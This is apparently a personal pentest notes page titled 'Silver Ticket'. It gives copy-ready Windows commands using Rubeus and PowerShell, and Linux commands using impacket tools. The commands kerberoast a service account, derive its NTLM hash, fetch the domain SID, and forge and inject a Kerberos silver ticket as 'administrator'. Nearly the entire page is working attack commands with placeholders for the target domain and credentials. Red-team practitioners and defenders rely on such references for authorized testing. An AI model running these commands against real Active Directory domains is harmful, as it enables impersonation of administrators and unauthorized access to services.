---
title: "Silver Ticket"
date: 2024-7-30
tags: ["silver ticket", "rubeus", "active directory", "ad", "domain controller", "Windows", "GetUserSPNs"]
---

---
### From Windows

#### 1. Get service principle name (SPN)

```powershell
.\rubeus.exe kerberoast /domain:<DOMAIN> /dc:<DC> /creduser:<DOMAIN>\<USER> /credpassword:<PASSWORD> /nowrap
```

#### 2. Generate NTLM

```powershell
.\rubeus.exe hash /password:<PASSWORD>
```

#### 3. Get domain SID

#### 3a. Locally

```powershell
import-module activedirectory
```

```powershell
Get-ADDomain | fl DomainSID
```

#### 3b. Remotely

```powershell
# Install ldp.exe (Windows 11)
Settings > System > Optional Features > More Windows Features and add 'Active Driectory Lightweight Directory Services'
```

```powershell 
# Bind > Bind with credentials
ldp.exe
```

```powershell
# Browse > Search
BaseDN: DC=<example>,DC=<com>
Filter: (objectclass=User)
```

#### 4. Generate silver ticket

```powershell
.\rubeus.exe silver /domain:<DOMAIN> /dc:<DC> /sid:<SID> /rc4:<HASH> /user:administrator /service:<SPN> /ptt
```

#### 5. Check

```powershell
klist
```

### From Linux

#### 1. Get service principle name (SPN)

```bash
sudo ntpdate -s <DC> && impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC> -request -k
```

```bash
# If NTLM auth is disabled
sudo ntpdate -s <DC> && impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-host <DC> -request -k
```

#### 2. Generate NTLM

```bash
iconv -f ASCII -t UTF-16LE <(printf "<PASSWORD>") | openssl dgst -md4
```

#### 3. Get domain SID

```bash
sudo ntpdate -s <DC> && impacket-getPac -targetUser administrator <DOMAIN>/<USER>:<PASSWORD>
```

#### 4. Generate Silver Ticket

```bash
impacket-ticketer -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> -dc-ip <DC> -spn <SPN> administrator
```

#### 5. Import ticket

```bash
export KRB5CCNAME=administrator.ccache
```

#### 6. Check

```bash
klist
```

<br>